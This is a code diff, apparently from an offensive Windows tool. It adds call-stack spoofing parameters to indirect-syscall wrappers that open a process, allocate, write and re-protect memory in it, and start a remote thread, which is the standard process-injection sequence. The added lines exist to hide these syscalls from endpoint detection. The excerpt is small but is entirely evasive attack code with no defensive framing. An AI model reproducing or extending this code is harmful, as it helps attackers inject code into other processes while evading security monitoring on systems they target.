@@ -27,6 +27,8 @@ static snd_status_t WINAPI sys_open_process(DWORD pid, DWORD desired_access, HAN
     snd_syscall_args_t args = {0};
     args.ssn                = entry.wSystemCall;
     args.sys_addr           = entry.pSyscallAddr;
+    args.spoof_addr         = entry.pSpoofAddr;
+    args.spoof_frame_size   = entry.dwSpoofFrameSize;
     args.arg1               = out_process;
     args.arg2               = (PVOID)(ULONG_PTR)desired_access;
     args.arg3               = &oa;
@@ -56,6 +58,8 @@ static snd_status_t WINAPI sys_alloc_remote(HANDLE process, SIZE_T size, DWORD a
     snd_syscall_args_t args = {0};
     args.ssn                = entry.wSystemCall;
     args.sys_addr           = entry.pSyscallAddr;
+    args.spoof_addr         = entry.pSpoofAddr;
+    args.spoof_frame_size   = entry.dwSpoofFrameSize;
     args.arg1               = process;
     args.arg2               = &local_base;
     args.arg3               = 0;
@@ -86,6 +90,8 @@ static snd_status_t WINAPI sys_write_remote(HANDLE process, PVOID base_address, 
     snd_syscall_args_t args = {0};
     args.ssn                = entry.wSystemCall;
     args.sys_addr           = entry.pSyscallAddr;
+    args.spoof_addr         = entry.pSpoofAddr;
+    args.spoof_frame_size   = entry.dwSpoofFrameSize;
     args.arg1               = process;
     args.arg2               = base_address;
     args.arg3               = (PVOID)buffer;
@@ -115,6 +121,8 @@ static snd_status_t WINAPI sys_protect_remote(HANDLE process, PVOID base_address
     snd_syscall_args_t args = {0};
     args.ssn                = entry.wSystemCall;
     args.sys_addr           = entry.pSyscallAddr;
+    args.spoof_addr         = entry.pSpoofAddr;
+    args.spoof_frame_size   = entry.dwSpoofFrameSize;
     args.arg1               = process;
     args.arg2               = &addr;
     args.arg3               = &regionSize;
@@ -144,6 +152,8 @@ static snd_status_t WINAPI sys_create_remote_thread(HANDLE process, PVOID start_
     snd_syscall_args_t args = {0};
     args.ssn                = entry.wSystemCall;
     args.sys_addr           = entry.pSyscallAddr;
+    args.spoof_addr         = entry.pSpoofAddr;
+    args.spoof_frame_size   = entry.dwSpoofFrameSize;
     args.arg1               = out_thread;
     args.arg2               = (PVOID)(ULONG_PTR)0x1FFFFF;
     args.arg3               = NULL;
@@ -172,6 +182,8 @@ static snd_status_t WINAPI sys_close_handle(HANDLE handle) {
     snd_syscall_args_t args = {0};
     args.ssn                = entry.wSystemCall;
     args.sys_addr           = entry.pSyscallAddr;
+    args.spoof_addr         = entry.pSpoofAddr;
+    args.spoof_frame_size   = entry.dwSpoofFrameSize;
     args.arg1               = handle;
 
     if (g_syscall_invoker == NULL) {
